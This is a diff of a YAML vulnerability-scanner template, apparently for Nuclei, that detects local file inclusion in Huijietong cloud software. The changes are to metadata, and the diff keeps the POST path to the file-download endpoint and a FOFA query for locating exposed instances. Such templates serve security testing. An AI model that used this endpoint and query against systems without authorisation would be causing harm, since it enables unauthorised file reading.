@@ -1,14 +1,16 @@
 id: huijietong-cloud-fileread
 
 info:
-  name: Huijietong Cloud File Read
+  name: Huijietong - Local File Inclusion
   author: princechaddha,ritikchaddha
+  description: Huijietong is vulnerable to local file inclusion.
   severity: high
   metadata:
+    max-request: 2
     fofa-query: body="/him/api/rest/v1.0/node/role"
   tags: huijietong,lfi
 
-requests:
+http:
   - method: POST
     path:
       - "{{BaseURL}}/fileDownload?action=downloadBackupFile"
@@ -31,3 +33,5 @@ requests:
       - type: status
         status:
           - 200
+
+# Enhanced by mp on 2022/08/03
